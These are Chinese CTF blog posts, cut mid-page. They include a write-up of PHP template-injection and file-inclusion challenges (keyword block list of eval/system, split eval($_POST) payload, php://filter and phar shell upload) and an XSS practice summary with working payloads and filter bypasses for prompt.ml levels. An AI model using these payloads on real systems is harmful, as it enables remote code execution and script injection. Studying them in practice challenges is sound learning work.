class="string">"&#123;haha:type&#125;"</span>,$type,$template_html);</span><br><span class="line">	$template_html = str_replace(<span class="string">"&#123;haha:typename&#125;"</span>,$typename,$template_html);</span><br><span class="line">	$template_html = parseIf($template_html);</span><br><span class="line">	<span class="keyword">return</span> $template_html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//被处理的关键词</span></span><br><span class="line"> $ra1 = <span class="keyword">Array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>,<span class="string">'_COOKIE'</span>,<span class="string">'_REQUEST'</span>,<span class="string">'if:'</span>,<span class="string">'javascript'</span>, <span class="string">'vbscript'</span>, <span class="string">'expression'</span>, <span class="string">'applet'</span>, <span class="string">'meta'</span>, <span class="string">'xml'</span>, <span class="string">'blink'</span>, <span class="string">'link'</span>, <span class="string">'style'</span>, <span class="string">'script'</span>, <span class="string">'embed'</span>, <span class="string">'object'</span>, <span class="string">'iframe'</span>, <span class="string">'frame'</span>, <span class="string">'frameset'</span>, <span class="string">'ilayer'</span>, <span class="string">'layer'</span>, <span class="string">'bgsound'</span>, <span class="string">'title'</span>, <span class="string">'base'</span>, <span class="string">'eval'</span>, <span class="string">'passthru'</span>, <span class="string">'exec'</span>, <span class="string">'assert'</span>, <span class="string">'system'</span>, <span class="string">'chroot'</span>, <span class="string">'chgrp'</span>, <span class="string">'chown'</span>, <span class="string">'shell_exec'</span>, <span class="string">'proc_open'</span>, <span class="string">'ini_restore'</span>, <span class="string">'dl'</span>, <span class="string">'readlink'</span>, <span class="string">'symlink'</span>, <span class="string">'popen'</span>, <span class="string">'stream_socket_server'</span>, <span class="string">'pfsockopen'</span>, <span class="string">'putenv'</span>, <span class="string">'cmd'</span>,<span class="string">'base64_decode'</span>,<span class="string">'fopen'</span>,<span class="string">'fputs'</span>,<span class="string">'replace'</span>,<span class="string">'input'</span>,<span class="string">'contents'</span>);</span><br><span class="line">    $ra2 = <span class="keyword">Array</span>(<span class="string">'onabort'</span>, <span class="string">'onactivate'</span>, <span class="string">'onafterprint'</span>, <span class="string">'onafterupdate'</span>, <span class="string">'onbeforeactivate'</span>, <span class="string">'onbeforecopy'</span>, <span class="string">'onbeforecut'</span>, <span class="string">'onbeforedeactivate'</span>, <span class="string">'onbeforeeditfocus'</span>, <span class="string">'onbeforepaste'</span>, <span class="string">'onbeforeprint'</span>, <span class="string">'onbeforeunload'</span>, <span class="string">'onbeforeupdate'</span>, <span class="string">'onblur'</span>, <span class="string">'onbounce'</span>, <span class="string">'oncellchange'</span>, <span class="string">'onchange'</span>, <span class="string">'onclick'</span>, <span class="string">'oncontextmenu'</span>, <span class="string">'oncontrolselect'</span>, <span class="string">'oncopy'</span>, <span class="string">'oncut'</span>, <span class="string">'ondataavailable'</span>, <span class="string">'ondatasetchanged'</span>, <span class="string">'ondatasetcomplete'</span>, <span class="string">'ondblclick'</span>, <span class="string">'ondeactivate'</span>, <span class="string">'ondrag'</span>, <span class="string">'ondragend'</span>, <span class="string">'ondragenter'</span>, <span class="string">'ondragleave'</span>, <span class="string">'ondragover'</span>, <span class="string">'ondragstart'</span>, <span class="string">'ondrop'</span>, <span class="string">'onerror'</span>, <span class="string">'onerrorupdate'</span>, <span class="string">'onfilterchange'</span>, <span class="string">'onfinish'</span>, <span class="string">'onfocus'</span>, <span class="string">'onfocusin'</span>, <span class="string">'onfocusout'</span>, <span class="string">'onhelp'</span>, <span class="string">'onkeydown'</span>, <span class="string">'onkeypress'</span>, <span class="string">'onkeyup'</span>, <span class="string">'onlayoutcomplete'</span>, <span class="string">'onload'</span>, <span class="string">'onlosecapture'</span>, <span class="string">'onmousedown'</span>, <span class="string">'onmouseenter'</span>, <span class="string">'onmouseleave'</span>, <span class="string">'onmousemove'</span>, <span class="string">'onmouseout'</span>, <span class="string">'onmouseover'</span>, <span class="string">'onmouseup'</span>, <span class="string">'onmousewheel'</span>, <span class="string">'onmove'</span>, <span class="string">'onmoveend'</span>, <span class="string">'onmovestart'</span>, <span class="string">'onpaste'</span>, <span class="string">'onpropertychange'</span>, <span class="string">'onreadystatechange'</span>, <span class="string">'onreset'</span>, <span class="string">'onresize'</span>, <span class="string">'onresizeend'</span>, <span class="string">'onresizestart'</span>, <span class="string">'onrowenter'</span>, <span class="string">'onrowexit'</span>, <span class="string">'onrowsdelete'</span>, <span class="string">'onrowsinserted'</span>, <span class="string">'onscroll'</span>, <span class="string">'onselect'</span>, <span class="string">'onselectionchange'</span>, <span class="string">'onselectstart'</span>, <span class="string">'onstart'</span>, <span class="string">'onstop'</span>, <span class="string">'onsubmit'</span>, <span class="string">'onunload'</span>);</span><br></pre></td></tr></table></figure>

<p>//经验证 正则没理解好，提取{if{内容}}</p>
<p>&amp;content=<search>{if{haha:type}T[1])}</search>&amp;type=:ev{haha:typename}&amp;typename=al($_POS</p>
<p>1=phpinfo();</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">源表达式</span><br><span class="line"></span><br><span class="line">&#123;if:eval($_POST[1])&#125;</span><br><span class="line"></span><br><span class="line">三处替换最多可以制造三个切割点</span><br><span class="line"></span><br><span class="line">第一个替换分割if:和$_POST[1]</span><br><span class="line"></span><br><span class="line">中间一个替换分割eval</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 这个题主要就是通过连续替换来分割敏感字符</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 白给的上传 level 3</span><br><span class="line"></span><br><span class="line">参考这个：https://maxncu.github.io/2019/04/05/%E4%B8%80%E9%81%93%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</span><br><span class="line"></span><br><span class="line">的确在好几个地方看到，后来甚至查到了wp，但是没做过这题的，做做还是挺好的</span><br><span class="line">这题是文件包含漏洞，主要是几个协议的使用</span><br><span class="line">1. php filter协议读取本地文件</span><br><span class="line">2. phar协议读取压缩包中的文件(具体参考php文档，这个性质要5.3版本以上)</span><br><span class="line"></span><br><span class="line">这题是白名单，就doc和docx可以上传，这里需要提一点本质上doc和docs都是压缩文件，所以可以用phar协议去操作</span><br><span class="line"></span><br><span class="line">我们先观察下这个f参数，参数名是upload，我们把它去掉，response为空，再试试index，该站无法正常运作。所以我猜测这里应该有文件包含漏洞，而且后台语句是include $_GET[&apos;f&apos;].&apos;.php&apos;</span><br><span class="line">那我们可以尝试用php://filter 协议读取upload和index的内容</span><br><span class="line"></span><br><span class="line">将回显base64解密</span><br><span class="line"></span><br><span class="line">``` upload.php</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">    $ext_arr = array(&apos;doc&apos;,&apos;docx&apos;);</span><br><span class="line">    $file_ext = substr($_FILES[&apos;upload_file&apos;][&apos;name&apos;],strrpos($_FILES[&apos;upload_file&apos;][&apos;name&apos;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">        $img_path = &quot;upload/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line"></span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">   $msg=&quot;上传成功,保存路径：&quot;.$img_path;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg = &quot;上传失败&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $msg = &quot;只允许上传.doc|.docx类型文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;form enctype=&quot;multipart/form-data&quot; method=&quot;post&quot;&gt;</span><br><span class="line">                &lt;h1&gt;老师喊你交实验报告了&lt;/h1&gt;</span><br><span class="line">                &lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;upload_file&quot;/&gt;</span><br><span class="line">                &lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot;/&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">            &lt;div id=&quot;msg&quot;&gt;</span><br><span class="line">                &lt;?php</span><br><span class="line">                    if($msg != null)&#123;</span><br><span class="line">                        echo &quot;提示：&quot;.$msg;</span><br><span class="line">                    &#125;</span><br><span class="line">                ?&gt;</span><br><span class="line">   &lt;/div&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> $f=$_GET[&apos;f&apos;];</span><br><span class="line"> if(isset($f))</span><br><span class="line">  include($f.&apos;.php&apos;);</span><br><span class="line"> else</span><br><span class="line">  header(&quot;location:index.php?f=upload&quot;)</span><br></pre></td></tr></table></figure>

<p>那么我们的思路来了，创建一个.doc改后缀为zip，把我们的shell搞进去，再上传的时候改回来，最后用phar协议读shell</p>
<p><img src="https://i.loli.net/2019/10/26/7wvkM6uENXTnVbp.png" alt="image.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wanghuidi.github.io/2019/11/03/近期比赛的wp/" data-id="ck2jra66u000hfbtl0v1vo099" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/">wp</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-xss练习小结" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/09/21/xss练习小结/" class="article-date">
  <time datetime="2019-09-21T00:42:42.000Z" itemprop="datePublished">2019-09-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/09/21/xss练习小结/">xss练习小结</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这一次萌生去练习xss还是因为打了rwctf，感觉这块自己还是不太熟悉，所以挑出来练一下。下面的题目解析并不是按照顺序，而是按照涉及的不同问题来分类的。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;练习网站是<b>prompt.ml</b>，整体做下来虽然感觉做出的题目很少，但确实学到了不少东西。</p>
<h3 id="关于几种编码"><a href="#关于几种编码" class="headerlink" title="关于几种编码"></a>关于几种编码</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xss的payload中使用的编码无非几种</p>
<ul>
<li>urlencode</li>
<li>html实体编码</li>
<li>unicode</li>
<li>base64</li>
<li>ascii(string.fromCharCode)</li>
</ul>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里有一篇文章很好地梳理了各种浏览器对xss的各种编码的解析 <a href="http://bobao.360.cn/learning/detail/292.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/292.html</a></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;主要的内容有这么几点：</p>
<ul>
<li><p>html元素共有五种:</p>
<ol>
<li><p>空元素（如br,area等等）这些元素不能容纳任何内容</p>
</li>
<li><p>纯文本元素(典型的是script和style)，这些元素只能容纳纯文本，也就是说，这些元素中间容纳的内容并不会被html解码。所以在script标签中使用html编码绕过waf是不会被解析的。</p>
</li>
<li><p>RCDTA元素，能容纳html实体引用和文本，也就是说，RCDTA元素中的html编码的字段会被解码。例如textarea元素和title元素。但是textarea和title内的元素标签并不会被解析。</p>
</li>
<li><p>外部元素，例如svg和MathML命名空间，内部能解析html实体，注释，文本，其他元素还有<i>CDATA</i>段。</p>
</li>
<li><p>其余的所有元素，解析内容和外部元素一样除了不能解析CDATA段。</p>
<br>
这里有一道题就用到了外部实体prompt第二关

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//                      v-- frowny face</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[=(]/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ok seriously, disallows equal signs and open parenthesis</span></span><br><span class="line">    <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ol>
</li>
</ul>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里过滤了=和(这造成了prompt函数无法完成，思路应该是用某种编码绕过waf。上面讲到的svg标签中不仅可以容纳子标签还可以解析html实体，所以最后的payload应该是</p>
<p>&lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;</p>

<br>

<ul>
<li><p>url编码</p>
<ol>
<li><p>url解码往往发生在需要引入url上下文的时候（通常是引入外部url的时候），通常这里会先进行一轮html decode，然后才进行url decode，通常这里可以用html实体编码隐藏一些被waf过滤的东西。例如这段经典的payload </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>url不能对协议和:进行解码，url合法的协议都应该是有ascii字母组成。</p>
</li>
</ol>
</li>
</ul>
<br>

<ul>
<li>javascript编码<ol>
<li>javascript中可以用unicode或者hex代替函数或者变量的名称，但是例如(),&gt;,=,’,”等等有特殊含义的符号不能如此处理。</li>
<li>通常javascript解析出现在script标签和可以调用javascipt的html标签属性处。</li>
<li>javascript一些不可打印字符可以拿来过waf比如\u2028</li>
</ol>
</li>
</ul>
<br>

<h3 id="html中一些小trick"><a href="#html中一些小trick" class="headerlink" title="html中一些小trick"></a>html中一些小trick</h3><ol>
<li><p>非闭合标签，这和浏览器的容错有关，例如prompt的第二关</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">prompt(1)</span> /</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>还是浏览器能兼容一些换行符比如\u2028,\r\n等等</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">     <span class="comment">// apply strict filter rules of level 0</span></span><br><span class="line">     <span class="comment">// filter "&gt;" and event handlers</span></span><br><span class="line">     input = input.replace(<span class="regexp">/&gt;|on.+?=|focus/gi</span>, <span class="string">'_'</span>);</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">return</span> <span class="string">'&lt;input value="'</span> + input + <span class="string">'"  type="text"&gt;'</span>;</span><br><span class="line"> &#125;  </span><br><span class="line"><span class="string">``</span><span class="string">` </span></span><br><span class="line"><span class="string">这里的payload，刚好可以绕过正则的过滤，而type=image 则可以将input视为图片标签从而转化到img事件处理达到xss的形式</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">``</span> html</span><br><span class="line"><span class="string">" src type= "</span>image<span class="string">" onerror=</span></span><br><span class="line"><span class="string">"</span>prompt(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>input标签的type，在某些情况下可以将input标签转化为img标签用</p>
</li>
</ol>
<h3 id="使用注释的一些小trick"><a href="#使用注释的一些小trick" class="headerlink" title="使用注释的一些小trick"></a>使用注释的一些小trick</h3><ol>
<li><p>html5中的闭合标签，例如prompt第三关</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">html</span><br><span class="line"><span class="comment">&lt;!-- --&gt;</span></span><br><span class="line">html5</span><br><span class="line"><span class="comment">&lt;!-- --!&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>html中–&gt; 会被解析为//，例如prompt第八关<br>这道题是典型的注释逃逸。</p>
<p>过滤了换行和&lt;，/注释符，还有</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) &#125;</span></span><br><span class="line"><span class="function"> // <span class="title">prevent</span> <span class="title">input</span> <span class="title">from</span> <span class="title">getting</span> <span class="title">out</span> <span class="title">of</span> <span class="title">comment</span></span></span><br><span class="line"><span class="function"> // <span class="title">strip</span> <span class="title">off</span> <span class="title">line</span>-<span class="title">breaks</span> <span class="title">and</span> <span class="title">stuff</span></span></span><br><span class="line"><span class="function"> <span class="title">input</span> = <span class="title">input</span>.<span class="title">replace</span>(<span class="params"><span class="regexp">/[\r\n&lt;/"]/g</span>, <span class="string">''</span></span>);</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">return</span> '                                \<span class="title">n</span>\</span></span><br><span class="line"><span class="function"> &lt;<span class="title">script</span>&gt;                                    \<span class="title">n</span>\</span></span><br><span class="line"><span class="function"> // <span class="title">console</span>.<span class="title">log</span>(<span class="params"><span class="string">"' + input + '"</span></span>);        \<span class="title">n</span>\</span></span><br><span class="line"><span class="function"> &lt;/<span class="title">script</span>&gt; ';</span></span><br><span class="line"><span class="function"> &#125;</span></span><br></pre></td></tr></table></figure>

<p>这里有两个点，一个是通过unicode的换行符\u2028做到换行的功能，另外一个是通过–&gt;会在html中被当做//来过滤剩下的未逃逸的部分</p>
<p>payload</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    prompt(1) --&gt;</span><br></pre></td></tr></table></figure>

<p>这里的payload有个处理的办法，就是将内容转化为\u2028prompt(1)\u2028放到console中得到编码后的串然后再提交。</p>
</li>
<li><p>多行标签内注入点，可以采用javascript块注释，html注释，还有根据浏览器的特殊标签来插入xss。</p>
<br>
例如prompt第七关和第十五关
<br>

<p> 第七关</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></span><br><span class="line">    <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span>(<span class="params">title</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// title can only contain 12 characters</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;p class="comment" title="'</span> + title.slice(<span class="number">0</span>, <span class="number">12</span>) + <span class="string">'"&gt;&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;).join(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 第十五关</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// sort of spoiler of level 7</span></span><br><span class="line">    input = input.replace(<span class="regexp">/\*/g</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></span><br><span class="line">    <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span>(<span class="params">title, index</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// title can only contain 15 characters</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;p class="comment" title="'</span> + title.slice(<span class="number">0</span>, <span class="number">15</span>) + <span class="string">'" data-comment=\'&#123;"id":'</span> + index + <span class="string">'&#125;\'&gt;&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;).join(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>分别是用javascript的块注释和html的注释进行绕过的</p>
<p>需要注意的一点是，使用html的注释时，注释中不能存在&gt;，这和注释的解析算法有关。弥补方法是添加svg标签。</p>
<h4 id="payload-7"><a href="#payload-7" class="headerlink" title="payload 7"></a>payload 7</h4><p>&quot;&gt;&lt;script&gt;/<em>#</em>/prompt(1/<em>#</em>/)&lt;/script&gt;</p>


<h4 id="payload-15"><a href="#payload-15" class="headerlink" title="payload 15"></a>payload 15</h4><p>&quot;&gt;&lt;svg&gt;&lt;!--#--&gt;&lt;script&gt;&lt;!--#--&gt;prompt(1&lt;!--#--&gt;)&lt;/script&gt;</p>
<br>

<h3 id="逻辑问题"><a href="#逻辑问题" class="headerlink" title="逻辑问题"></a>逻辑问题</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;典型的逻辑问题就是二次过滤，因为这个过程给了通过waf来构造waf的机会。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;典型的例子就是prompt的第10关</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// (╯°□°）╯︵ ┻━┻</span></span><br><span class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/prompt/g</span>, <span class="string">'alert'</span>);</span><br><span class="line">    <span class="comment">// ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro</span></span><br><span class="line">    input = input.replace(<span class="regexp">/'/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;'</span> + input + <span class="string">'&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;问题很明显，传入类似pr’ompt(1)的表达式能过第一个waf，并且可以利用第二个置空来出掉多余的’。</p>
<h3 id="javascript的小tricks"><a href="#javascript的小tricks" class="headerlink" title="javascript的小tricks"></a>javascript的小tricks</h3><ol>
<li><p>javascript变量覆盖问题</p>
<p>prompt的第六关</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line"> <span class="comment">// let's do a post redirection</span></span><br><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="comment">// pass in formURL#formDataJSON</span></span><br><span class="line">     <span class="comment">// e.g. http://httpbin.org/post#&#123;"name":"Matt"&#125;</span></span><br><span class="line">     <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line">     <span class="keyword">var</span> formURL = segments[<span class="number">0</span>];</span><br><span class="line">     <span class="keyword">var</span> formData = <span class="built_in">JSON</span>.parse(segments[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">var</span> form = <span class="built_in">document</span>.createElement(<span class="string">'form'</span>);</span><br><span class="line">     form.action = formURL;</span><br><span class="line">     form.method = <span class="string">'post'</span>;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> formData) &#123;</span><br><span class="line">         <span 